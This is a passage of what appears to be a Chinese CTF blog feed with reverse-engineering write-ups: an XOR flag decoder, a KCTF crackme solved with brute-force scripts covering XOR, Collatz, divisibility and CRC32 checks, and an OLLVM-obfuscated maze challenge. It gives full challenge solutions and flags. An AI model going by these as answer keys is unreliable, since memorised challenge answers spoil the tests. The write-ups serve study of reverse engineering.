data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205262210460.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>这里的sub_14000F3B0就是我们要找的关键函数</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205262210850.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205262210850.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>也可以通过MessageBox函数来找。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data = [  <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x55</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x5E</span>, <span class="number">0x54</span>, <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x50</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x53</span>, <span class="number">0x5F</span>, <span class="number">0x50</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x53</span>, <span class="number">0x05</span>, <span class="number">0x55</span>, <span class="number">0x00</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x57</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x52</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x53</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(data[i] ^ <span class="number">102</span>), end = <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>异或写脚本得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205262214536.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205262214536.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p></div>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -[wer] </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>末日邀请</title>
      <link href="/2022/05/24/KCTF-%E6%9C%AB%E6%97%A5%E9%82%80%E8%AF%B7%EF%BC%88%E5%8A%A0%E5%AF%86%E9%97%AF%E5%85%B3%EF%BC%89/"/>
      <url>/2022/05/24/KCTF-%E6%9C%AB%E6%97%A5%E9%82%80%E8%AF%B7%EF%BC%88%E5%8A%A0%E5%AF%86%E9%97%AF%E5%85%B3%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>先是输入flag也就是ID，然后进行check，主要考察算法。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205151944388.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205151944388.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>对我们的输入进行一系列异或，最后赋值给v39，注意这里v39类型是char，接着进行sbox数据初始化，</p><p>然后进行CRC32验证，这里可以动调取到flag，这里v34的值后面会给出并进行验证。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205151954909.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205151954909.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>接着先将字符转成数值，存入内存，并且如果大于58就减去55.接着用冰雹猜想验证输入的前三位。我们可以爆破得到v17的值是定值7.具体前三位先按下不表</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205152014418.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205152014418.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>爆破代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> i; <span class="comment">// edx</span></span><br><span class="line"><span class="type">int</span> v13; <span class="comment">// ecx</span></span><br><span class="line"><span class="type">int</span> v15; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> j; <span class="comment">// edx</span></span><br><span class="line"><span class="type">int</span> v17; <span class="comment">// edi</span></span><br><span class="line"><span class="type">int</span> v33[<span class="number">200</span>]; <span class="comment">// [esp+10h] [ebp-368h]</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xff</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v13 = i;</span><br><span class="line">        v15 = v13;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; <span class="number">200</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((v15 &amp; <span class="number">1</span>) != <span class="number">0</span>)                     <span class="comment">// 奇数*3+1</span></span><br><span class="line">                v15 = <span class="number">3</span> * v15 + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                v15 &gt;&gt;= <span class="number">1</span>;                              <span class="comment">// 偶数右移1</span></span><br><span class="line">            v33[j] = v15;</span><br><span class="line">        &#125;</span><br><span class="line">        v17 = v33[<span class="number">198</span>] | v33[<span class="number">197</span>] | v33[<span class="number">196</span>];</span><br><span class="line">        cout &lt;&lt; v17 &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面就是判断后四位是否为KCTF</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205152022192.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205152022192.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>动调发现是v41[1]是输入的第8个字符，推测后面还需要验证九位，然后进行取余验证，依次取最高前i位，看是否能取余i，不能则失败。但是后面对这里有一个约束。先是冒泡排序从小到大排序，然后对比1<del>9，也就是必须包含1</del>9每个数字</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205152025132.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205152025132.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205152036244.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205152036244.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>爆破取得这九位：381654729</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>,<span class="number">1000000000</span>):</span><br><span class="line">    <span class="keyword">if</span> i//<span class="number">10000000</span> %<span class="number">2</span> == <span class="number">0</span> <span class="keyword">and</span> i//<span class="number">1000000</span>%<span class="number">3</span> == <span class="number">0</span> <span class="keyword">and</span> i//<span class="number">100000</span>%<span class="number">4</span> == <span class="number">0</span> <span class="keyword">and</span> i//<span class="number">10000</span>%<span class="number">5</span> == <span class="number">0</span> <span class="keyword">and</span> i//<span class="number">1000</span> %<span class="number">6</span> == <span class="number">0</span> <span class="keyword">and</span> i//<span class="number">100</span> % <span class="number">7</span> == <span class="number">0</span> <span class="keyword">and</span> i//<span class="number">10</span> % <span class="number">8</span> == <span class="number">0</span> <span class="keyword">and</span> i%<span class="number">9</span> == <span class="number">0</span>:</span><br><span class="line">        num_all = <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;1&quot;</span> <span class="keyword">in</span> num_all <span class="keyword">and</span> <span class="string">&quot;2&quot;</span> <span class="keyword">in</span> num_all <span class="keyword">and</span> <span class="string">&quot;3&quot;</span> <span class="keyword">in</span> num_all <span class="keyword">and</span> <span class="string">&quot;4&quot;</span> <span class="keyword">in</span> num_all <span class="keyword">and</span> <span class="string">&quot;5&quot;</span> <span class="keyword">in</span> num_all <span class="keyword">and</span> <span class="string">&quot;6&quot;</span> <span class="keyword">in</span> num_all <span class="keyword">and</span> <span class="string">&quot;7&quot;</span> <span class="keyword">in</span> num_all <span class="keyword">and</span> <span class="string">&quot;8&quot;</span> <span class="keyword">in</span> num_all <span class="keyword">and</span> <span class="string">&quot;9&quot;</span> <span class="keyword">in</span> num_all :</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>最后就是判断v34是否相等 也就是前三位</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205152049128.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205152049128.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>爆破得到前三位：421</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">uint32_t</span> magic_arr[] = &#123;<span class="number">0x00000000</span>, <span class="number">0x09073096</span>, <span class="number">0x120E612C</span>, <span class="number">0x1B0951BA</span>, <span class="number">0xFF6DC419</span>, <span class="number">0xF66AF48F</span>, <span class="number">0xED63A535</span>, <span class="number">0xE46495A3</span>,</span><br><span class="line">                        <span class="number">0xFEDB8832</span>, <span class="number">0xF7DCB8A4</span>, <span class="number">0xECD5E91E</span>, <span class="number">0xE5D2D988</span>, <span class="number">0x01B64C2B</span>, <span class="number">0x08B17CBD</span>, <span class="number">0x13B82D07</span>, <span class="number">0x1ABF1D91</span>,</span><br><span class="line">                        <span class="number">0xFDB71064</span>, <span class="number">0xF4B020F2</span>, <span class="number">0xEFB97148</span>, <span class="number">0xE6BE41DE</span>, <span class="number">0x02DAD47D</span>, <span class="number">0x0BDDE4EB</span>, <span class="number">0x10D4B551</span>, <span class="number">0x19D385C7</span>,</span><br><span class="line">                        <span class="number">0x036C9856</span>, <span class="number">0x0A6BA8C0</span>, <span class="number">0x1162F97A</span>, <span class="number">0x1865C9EC</span>, <span class="number">0xFC015C4F</span>, <span class="number">0xF5066CD9</span>, <span class="number">0xEE0F3D63</span>, <span class="number">0xE7080DF5</span>,</span><br><span class="line">                        <span class="number">0xFB6E20C8</span>, <span class="number">0xF269105E</span>, <span class="number">0xE96041E4</span>, <span class="number">0xE0677172</span>, <span class="number">0x0403E4D1</span>, <span class="number">0x0D04D447</span>, <span class="number">0x160D85FD</span>, <span class="number">0x1F0AB56B</span>,</span><br><span class="line">                        <span class="number">0x05B5A8FA</span>, <span class="number">0x0CB2986C</span>, <span class="number">0x17BBC9D6</span>, <span class="number">0x1EBCF940</span>, <span class="number">0xFAD86CE3</span>, <span class="number">0xF3DF5C75</span>, <span class="number">0xE8D60DCF</span>, <span class="number">0xE1D13D59</span>,</span><br><span class="line">                        <span class="number">0x06D930AC</span>, <span class="number">0x0FDE003A</span>, <span class="number">0x14D75180</span>, <span class="number">0x1DD06116</span>, <span class="number">0xF9B4F4B5</span>, <span class="number">0xF0B3C423</span>, <span class="number">0xEBBA9599</span>, <span class="number">0xE2BDA50F</span>,</span><br><span class="line">                        <span class="number">0xF802B89E</span>, <span class="number">0xF1058808</span>, <span class="number">0xEA0CD9B2</span>, <span class="number">0xE30BE924</span>, <span class="number">0x076F7C87</span>, <span class="number">0x0E684C11</span>, <span class="number">0x15611DAB</span>, <span class="number">0x1C662D3D</span>,</span><br><span class="line">                        <span class="number">0xF6DC4190</span>, <span class="number">0xFFDB7106</span>, <span class="number">0xE4D220BC</span>, <span class="number">0xEDD5102A</span>, <span class="number">0x09B18589</span>, <span class="number">0x00B6B51F</span>, <span class="number">0x1BBFE4A5</span>, <span class="number">0x12B8D433</span>,</span><br><span class="line">                        <span class="number">0x0807C9A2</span>, <span class="number">0x0100F934</span>, <span class="number">0x1A09A88E</span>, <span class="number">0x130E9818</span>, <span class="number">0xF76A0DBB</span>, <span class="number">0xFE6D3D2D</span>, <span class="number">0xE5646C97</span>, <span class="number">0xEC635C01</span>,</span><br><span class="line">                        <span class="number">0x0B6B51F4</span>, <span class="number">0x026C6162</span>, <span class="number">0x196530D8</span>, <span class="number">0x1062004E</span>, <span class="number">0xF40695ED</span>, <span class="number">0xFD01A57B</span>, <span class="number">0xE608F4C1</span>, <span class="number">0xEF0FC457</span>,</span><br><span class="line">                        <span class="number">0xF5B0D9C6</span>, <span class="number">0xFCB7E950</span>, <span class="number">0xE7BEB8EA</span>, <span class="number">0xEEB9887C</span>, <span class="number">0x0ADD1DDF</span>, <span class="number">0x03DA2D49</span>, <span class="number">0x18D37CF3</span>, <span class="number">0x11D44C65</span>,</span><br><span class="line">                        <span class="number">0x0DB26158</span>, <span class="number">0x04B551CE</span>, <span class="number">0x1FBC0074</span>, <span class="number">0x16BB30E2</span>, <span class="number">0xF2DFA541</span>, <span class="number">0xFBD895D7</span>, <span class="number">0xE0D1C46D</span>, <span class="number">0xE9D6F4FB</span>,</span><br><span class="line">                        <span class="number">0xF369E96A</span>, <span class="number">0xFA6ED9FC</span>, <span class="number">0xE1678846</span>, <span class="number">0xE860B8D0</span>, <span class="number">0x0C042D73</span>, <span class="number">0x05031DE5</span>, <span class="number">0x1E0A4C5F</span>, <span class="number">0x170D7CC9</span>,</span><br><span class="line">                        <span class="number">0xF005713C</span>, <span class="number">0xF90241AA</span>, <span class="number">0xE20B1010</span>, <span class="number">0xEB0C2086</span>, <span class="number">0x0F68B525</span>, <span class="number">0x066F85B3</span>, <span class="number">0x1D66D409</span>, <span class="number">0x1461E49F</span>,</span><br><span class="line">                        <span class="number">0x0EDEF90E</span>, <span class="number">0x07D9C998</span>, <span class="number">0x1CD09822</span>, <span class="number">0x15D7A8B4</span>, <span class="number">0xF1B33D17</span>, <span class="number">0xF8B40D81</span>, <span class="number">0xE3BD5C3B</span>, <span class="number">0xEABA6CAD</span>,</span><br><span class="line">                        <span class="number">0xEDB88320</span>, <span class="number">0xE4BFB3B6</span>, <span class="number">0xFFB6E20C</span>, <span class="number">0xF6B1D29A</span>, <span class="number">0x12D54739</span>, <span class="number">0x1BD277AF</span>, <span class="number">0x00DB2615</span>, <span class="number">0x09DC1683</span>,</span><br><span class="line">                        <span class="number">0x13630B12</span>, <span class="number">0x1A643B84</span>, <span class="number">0x016D6A3E</span>, <span class="number">0x086A5AA8</span>, <span class="number">0xEC0ECF0B</span>, <span class="number">0xE509FF9D</span>, <span class="number">0xFE00AE27</span>, <span class="number">0xF7079EB1</span>,</span><br><span class="line">                        <span class="number">0x100F9344</span>, <span class="number">0x1908A3D2</span>, <span class="number">0x0201F268</span>, <span class="number">0x0B06C2FE</span>, <span class="number">0xEF62575D</span>, <span class="number">0xE66567CB</span>, <span class="number">0xFD6C3671</span>, <span class="number">0xF46B06E7</span>,</span><br><span class="line">                        <span class="number">0xEED41B76</span>, <span class="number">0xE7D32BE0</span>, <span class="number">0xFCDA7A5A</span>, <span class="number">0xF5DD4ACC</span>, <span class="number">0x11B9DF6F</span>, <span class="number">0x18BEEFF9</span>, <span class="number">0x03B7BE43</span>, <span class="number">0x0AB08ED5</span>,</span><br><span class="line">                        <span class="number">0x16D6A3E8</span>, <span class="number">0x1FD1937E</span>, <span class="number">0x04D8C2C4</span>, <span class="number">0x0DDFF252</span>, <span class="number">0xE9BB67F1</span>, <span class="number">0xE0BC5767</span>, <span class="number">0xFBB506DD</span>, <span class="number">0xF2B2364B</span>,</span><br><span class="line">                        <span class="number">0xE80D2BDA</span>, <span class="number">0xE10A1B4C</span>, <span class="number">0xFA034AF6</span>, <span class="number">0xF3047A60</span>, <span class="number">0x1760EFC3</span>, <span class="number">0x1E67DF55</span>, <span class="number">0x056E8EEF</span>, <span class="number">0x0C69BE79</span>,</span><br><span class="line">                        <span class="number">0xEB61B38C</span>, <span class="number">0xE266831A</span>, <span class="number">0xF96FD2A0</span>, <span class="number">0xF068E236</span>, <span class="number">0x140C7795</span>, <span class="number">0x1D0B4703</span>, <span class="number">0x060216B9</span>, <span class="number">0x0F05262F</span>,</span><br><span class="line">                        <span class="number">0x15BA3BBE</span>, <span class="number">0x1CBD0B28</span>, <span class="number">0x07B45A92</span>, <span class="number">0x0EB36A04</span>, <span class="number">0xEAD7FFA7</span>, <span class="number">0xE3D0CF31</span>, <span class="number">0xF8D99E8B</span>, <span class="number">0xF1DEAE1D</span>,</span><br><span class="line">                        <span class="number">0x1B64C2B0</span>, <span class="number">0x1263F226</span>, <span class="number">0x096AA39C</span>, <span class="number">0x006D930A</span>, <span class="number">0xE40906A9</span>, <span class="number">0xED0E363F</span>, <span class="number">0xF6076785</span>, <span class="number">0xFF005713</span>,</span><br><span class="line">                        <span class="number">0xE5BF4A82</span>, <span class="number">0xECB87A14</span>, <span class="number">0xF7B12BAE</span>, <span class="number">0xFEB61B38</span>, <span class="number">0x1AD28E9B</span>, <span class="number">0x13D5BE0D</span>, <span class="number">0x08DCEFB7</span>, <span class="number">0x01DBDF21</span>,</span><br><span class="line">                        <span class="number">0xE6D3D2D4</span>, <span class="number">0xEFD4E242</span>, <span class="number">0xF4DDB3F8</span>, <span class="number">0xFDDA836E</span>, <span class="number">0x19BE16CD</span>, <span class="number">0x10B9265B</span>, <span class="number">0x0BB077E1</span>, <span class="number">0x02B74777</span>,</span><br><span class="line">                        <span class="number">0x18085AE6</span>, <span class="number">0x110F6A70</span>, <span class="number">0x0A063BCA</span>, <span class="number">0x03010B5C</span>, <span class="number">0xE7659EFF</span>, <span class="number">0xEE62AE69</span>, <span class="number">0xF56BFFD3</span>, <span class="number">0xFC6CCF45</span>,</span><br><span class="line">                        <span class="number">0xE00AE278</span>, <span class="number">0xE90DD2EE</span>, <span class="number">0xF2048354</span>, <span class="number">0xFB03B3C2</span>, <span class="number">0x1F672661</span>, <span class="number">0x166016F7</span>, <span class="number">0x0D69474D</span>, <span class="number">0x046E77DB</span>,</span><br><span class="line">                        <span class="number">0x1ED16A4A</span>, <span class="number">0x17D65ADC</span>, <span class="number">0x0CDF0B66</span>, <span class="number">0x05D83BF0</span>, <span class="number">0xE1BCAE53</span>, <span class="number">0xE8BB9EC5</span>, <span class="number">0xF3B2CF7F</span>, <span class="number">0xFAB5FFE9</span>,</span><br><span class="line">                        <span class="number">0x1DBDF21C</span>, <span class="number">0x14BAC28A</span>, <span class="number">0x0FB39330</span>, <span class="number">0x06B4A3A6</span>, <span class="number">0xE2D03605</span>, <span class="number">0xEBD70693</span>, <span class="number">0xF0DE5729</span>, <span class="number">0xF9D967BF</span>,</span><br><span class="line">                        <span class="number">0xE3667A2E</span>, <span class="number">0xEA614AB8</span>, <span class="number">0xF1681B02</span>, <span class="number">0xF86F2B94</span>, <span class="number">0x1C0BBE37</span>, <span class="number">0x150C8EA1</span>, <span class="number">0x0E05DF1B</span>, <span class="number">0x0702EF8D</span>&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> cstr[] = <span class="string">&quot;...KCTF381654729&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0x20</span>; i &lt; <span class="number">0x7e</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0x20</span>; j &lt; <span class="number">0x7e</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0x20</span>; k &lt; <span class="number">0x7e</span>; k++) &#123;</span><br><span class="line">                cstr[<span class="number">0</span>] = i;</span><br><span class="line">                cstr[<span class="number">1</span>] = j;</span><br><span class="line">                cstr[<span class="number">2</span>] = k;</span><br><span class="line">                <span class="type">int32_t</span> v11 = <span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> idx = <span class="number">0</span>; idx &lt; <span class="number">16</span>; idx++) &#123;</span><br><span class="line">                    v11 = magic_arr[(<span class="type">uint8_t</span>)(v11 ^ cstr[idx])] ^ (v11 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ((~v11) == <span class="number">0xF52E0765</span>) &#123;  </span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%c %c %c\n&quot;</span>, i, j, k);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后的flag:421KCTF381654729</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -加解密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ezam</title>
      <link href="/2022/05/24/ezam%EF%BC%88ollvm%20%E8%BF%B7%E5%AE%AB%20%E8%BF%9B%E5%88%B6%EF%BC%89/"/>
      <url>/2022/05/24/ezam%EF%BC%88ollvm%20%E8%BF%B7%E5%AE%AB%20%E8%BF%9B%E5%88%B6%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>题目打开<br /></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205082339933.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205082339933.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><br />标准的ollvm混肴，用脚本两次去除<br /></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205082339395.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205082339395.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br /><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205082339683.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205082339683.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br /></p><p>得到正常的程序<br /></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205082340650.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205082340650.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><br /><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205082343947.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205082343947.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br />初步分析是以为多项式相加，疏忽了v17以及前面一大段数据的初始化。想着用z3硬解失败了。<br />主要逻辑为读取输入，判断是否为数字，然后转换成四进制，走迷宫。<br />前面的一大段加密是初始化迷宫地图v17，我们可以动调得到一个16*28的迷宫：（做题多尝试</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span 